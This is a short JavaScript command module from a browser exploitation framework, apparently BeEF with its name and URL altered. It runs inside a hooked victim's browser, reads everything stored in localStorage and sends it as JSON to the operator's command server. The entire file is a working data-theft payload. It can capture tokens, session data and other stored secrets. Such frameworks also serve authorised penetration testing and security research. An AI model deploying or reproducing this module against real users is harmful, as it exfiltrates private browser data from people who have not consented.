//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {
	if ('localStorage' in window && window['localStorage'] !== null) {
		server.net.send("<%= @command_url %>", <%= @command_id %>, "localStorage="+JSON.stringify(window['localStorage']));
	} else server.net.send("<%= @command_url %>", <%= @command_id %>, "localStorage="+JSON.stringify("HTML5 localStorage is null or not supported."));
});
